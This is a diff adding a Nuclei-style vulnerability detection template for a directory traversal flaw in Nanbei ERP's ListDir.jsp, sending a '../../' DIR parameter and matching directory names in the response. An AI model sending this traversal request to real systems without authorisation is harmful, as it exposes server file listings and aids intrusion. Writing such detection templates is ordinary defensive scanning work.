@@ -1,0 +1,27 @@
+id: nanbeiERP-ListDir_jsp-Directory-traversal
+
+info:
+  name: 南北软件ERP ListDir.jsp 目录遍历漏洞
+  author: nanbeiERP
+  severity: medium
+  tags: Directory traversal
+
+http:
+  - raw:
+      - |
+        GET /snsoft/tool/ListDir.jsp?DIR=../../ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'webapps'
+          - 'snconfig'
+          - 'LICENSE'
+          - 'work'
+        condition: and
+      - type: status
+        status: 
+          - 200
